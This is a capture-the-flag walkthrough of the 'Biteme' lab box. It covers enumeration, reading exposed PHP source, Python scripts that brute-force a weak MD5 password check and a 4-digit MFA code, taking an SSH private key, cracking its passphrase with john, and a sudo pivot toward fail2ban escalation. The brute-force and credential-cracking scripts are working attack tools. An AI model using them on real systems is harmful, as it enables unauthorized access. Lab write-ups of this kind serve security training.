## Biteme


1. Enumerate with nmap. Ports 22 and 80 are open.
```
$ sudo nmap -sS -A 10.10.15.20                                                                                                                                                                       130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 13:07 EDT
Nmap scan report for 10.10.15.20
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/13%OT=22%CT=1%CU=40866%PV=Y%DS=4%DC=T%G=Y%TM=622E251
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=2%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:07%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O
OS:3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   55.47 ms  10.13.0.1
2   ... 3
4   197.14 ms 10.10.15.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.93 seconds
```

2. Discover content with gobuster. There's a directory named `console`, run gobuster on that as well
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.15.20/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/13 13:12:47 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/console              (Status: 301) [Size: 312] [--> http://10.10.15.20/console/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]

===============================================================
2022/03/13 13:14:20 Finished
===============================================================
```
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.15.20/console
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.20/console
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/13 13:16:22 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 316] [--> http://10.10.15.20/console/css/]
/index.php            (Status: 200) [Size: 3961]                                     
/robots.txt           (Status: 200) [Size: 25]                                       
/securimage           (Status: 301) [Size: 323] [--> http://10.10.15.20/console/securimage/]
                                                                                            
===============================================================
2022/03/13 13:17:54 Finished
===============================================================
```

3. Go to `/console/index.php` and we find a sign in page with a captcha generated by [securimage](https://www.phpcaptcha.org/). Check the page source and we find a obfuscated js function. Run the `eval()` line in the console on the login page and we find `@fred I turned on php file syntax highlighting for you to review... jason`
```
function handleSubmit() {
	eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
	return true;
}
```

4. Google `php file syntax highlighting` and we find the [highlight_file php manual page](https://www.php.net/manual/en/function.highlight-file.php). We see that `Many servers are configured to automatically highlight files with a phps extension. For example, example.phps when viewed will show the syntax highlighted source of the file.`

5. Try going to `/console/index.phps` and we find a php script. The script includes `functions.php` and `securimage/securimage.php`, checks if all the fields on the form have been filled, creates a new captcha and checks if it's been input correctly. Then it checks if the username and password are correct with the `is_valid_user` and `is_valid_pwd` functions, which are probably imported from `functions.php`. If they're correct, it sends cookies and a header to `mfa.php`
```
<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
?>
```

6. Try going to `/console/functions.php` and we get a black page. Try `/console/functions.phps` and we get another php script. The script includes `config.php`, which we can view by navigating to `/console/config.phps`. `is_valid_user` checks to see if the hex encoded string of the input user is equal to `LOGIN_USER`, which we see in `config.phps` is equal to `6a61736f6e5f746573745f6163636f756e74`. Convert this from hex and we get the username `jason_test_account`.
```
<?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
}
```
```
<?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74');
```

7. `is_valid_pwd` checks if the md5 hash of the password ends with `001`. I wrote a basic python script to hash words from a wordlist and check if it ends with `001`. We find that the md5 hash of `violet` ends with `001`, so the password is `violet`
```
import hashlib

flag = False

with open("/usr/share/wordlists/rockyou.txt", "r") as file:
    for lines in file:
        line = lines.strip()
        hash = hashlib.md5(line.encode("utf-8")).hexdigest()
        if (hash)[-3:] == '001':
            print(line, hash)
            break
```

8. Login with the credentials and we're directed to a multi-factor authentication page. Check the source of the page and we find another obfuscated function. Run the function in the console and we get `@fred we need to put some brute force protection on here, remind me in the morning... jason`. We can brute force all the 4 digit numbers, so `1000-9999`. But first we need to find how the cookies are sent so we can automate it
```
function handleSubmit() {
  eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'@2 3 4 5 6 7 8 9 a b c, d e f g h... i\');',19,19,'console|log|fred|we|need|to|put|some|brute|force|protection|on|here|remind|me|in|the|morning|jason'.split('|'),0,{}));
  return true;
}
```

9. Open up Burp Suite, go to the Proxy tab and open the built in browser. Login to the website using the same credentials as earlier, enter any 4 digit mfa code and find the structure of the request sent to the server. We see that the cookie is sent in the header in the format `Cookie: PHPSESSID=bto7qs70nud0feb21qnr86qad4; user=jason_test_account; pwd=violet` and the data is just `code=1234`
```
POST /console/mfa.php HTTP/1.1
Host: 10.10.15.20
Content-Length: 9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.15.20
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.15.20/console/mfa.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bto7qs70nud0feb21qnr86qad4; user=jason_test_account; pwd=violet
Connection: close

code=1234
```

10. I created a python script to brute force the mfa using the cookie and data structure. Replace the `PHPSESSID` with your own cookie, which you can find with Inspect > Application > Cookies. Also replace the URL
```
import requests


for i in range(1000, 10000):
    x = requests.post("http://10.10.6.120/console/mfa.php", cookies={"PHPSESSID": "s9f328hipvn89ca7e3duvev7a1", "user": "jason_test_account", "pwd": "violet"}, data={"code": f"{i}"})
    print(i)
    if "Incorrect" not in x.text:
        print("Your code is", i)
        break
```

11. After finding the code, enter the code and we're directed to a filel browser and a file viewer. In the file browser, use `/home` and we find 2 users, fred and jason. Using `/home/jason` shows us that there's a `user.txt` in jason's directory. Use `/home/jason/user.txt` in the file viewer to get `THM{6fbf1fb7241dac060cd3abba70c33070}`

12. We also see a `.ssh` in jason's directory. It has 3 files, authorized_keys, id_rsa, and id_rsa.pub. When we try to open them with the file viewer, we see that we have access to id_rsa and id_rsa.pub but not to authorized_keys. That's fine, because we can copy the private key from id_rsa onto our own machine and login with the private key. Make a new file on your machine, copy the text from `id_rsa` onto it, change the permissions of the private key file with `chmod 600 id_rsa`. When we try it with `ssh -i <private key file> jason@<ip>` we see that we need a passphrase for the private key
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
-----END RSA PRIVATE KEY-----
```

13. We can find the passphrase from the private key file using johntheripper. Download [ssh2john.py](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py), run it on the private key file and output the hash to another file with `python3 ssh2john.py id_rsa > hash.txt`. Then crack the hash with john using the rockyou wordlist with `john --wordlist=<location of rockyou> <location of hash file>` and we find the passphrase is `1a2b3c4d`. Now login as jason with ssh

14. Run `sudo -l` to see if we have any special permissions and we find that we can run any command as fred. Now run `sudo -u fred sudo -l` to see if fred has any special permissions and we find that fred can restart a service called `fail2ban`
```
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```
```
jason@biteme:~$ sudo -u fred sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
```

15. We find an article about [fail2ban privilege escalation](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/). This is possible if we have write permission in the `/etc/fail2ban/action.d` folder and we're able to write to `iptables-multiport.conf`
